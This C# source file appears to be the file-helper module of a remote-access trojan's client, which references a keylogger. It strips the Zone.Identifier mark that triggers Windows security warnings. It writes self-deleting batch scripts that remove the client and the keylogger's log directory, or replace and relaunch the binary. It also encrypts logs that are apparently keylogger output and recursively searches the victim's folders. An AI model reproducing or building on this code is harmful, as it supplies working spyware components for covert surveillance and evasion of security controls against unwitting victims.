using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class FileHelper
    {
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly Random _rnd = new Random(Environment.TickCount);

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        /// <summary>
        /// Creates an unused temp file path. 
        /// </summary>
        /// <param name="extension">The file extension with dot.</param>
        /// <returns>The path to the temp file.</returns>
        public static string GetTempFilePath(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }

        public static bool IsValidExecuteableFile(byte[] block)
        {
            if (block.Length < 2) return false;
            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static string CreateUninstallBatch(bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string updateBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateRestartBatch()
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string restartBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));

                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Appends text to a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="appendText">The text to append.</param>
        public static void WriteLogFile(string filename, string appendText)
        {
            appendText = ReadLogFile(filename) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        public static string ReadLogFile(string filename)
        {
            return File.Exists(filename)
                ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename)))
                : string.Empty;
        }

        public class SearchDirectoryQuery
        {
            public string Directory;
            public string SearchString;
            public bool Recursive;
            public Action<FileInfo[]> Action;
            public CancellationToken Token;
            public ManualResetEvent Reset;
        }

        public static void SearchDirectory(object query)
        {
            if (!(query is SearchDirectoryQuery))
                return;

            SearchDirectoryImpl((SearchDirectoryQuery) query);
            ((SearchDirectoryQuery)query).Reset.Set();
        }

        public static void SearchDirectoryImpl(SearchDirectoryQuery query)
        {
            string searchString = query.SearchString;
            string directory = query.Directory;
            bool recursive = query.Recursive;
            Action<FileInfo[]> action = query.Action;
            CancellationToken token = query.Token;

            string[] searchPatterns = searchString.Contains(",") ? searchString.Split(',') : new[] { searchString };
            DirectoryInfo currentDir = null;
            try
            {
                currentDir = new DirectoryInfo(directory);
                foreach (string pattern in searchPatterns)
                {
                    if (token.IsCancellationRequested)
                        return;
                    action(currentDir.GetFiles(pattern.Trim()));
                }
            }
            catch // To avoid exceptions for unusual directories (recycle bin etc)
            {

            }

            if (recursive)
            {
                try
                {
                    if (currentDir != null)
                        foreach (var subDir in currentDir.GetDirectories())
                        {
                            if (token.IsCancellationRequested)
                                return;
                            foreach (string pattern in searchPatterns)
                            {
                                if (token.IsCancellationRequested)
                                {
                                    query.Reset.Set();
                                    return;
                                }
                                query.SearchString = pattern;
                                query.Directory = subDir.FullName;
                                query.Recursive = true;
                                SearchDirectoryImpl(query);
                            }
                        }
                }
                catch // To avoid UnauthorizedAccessException
                {

                }
            }
        }
    }
}
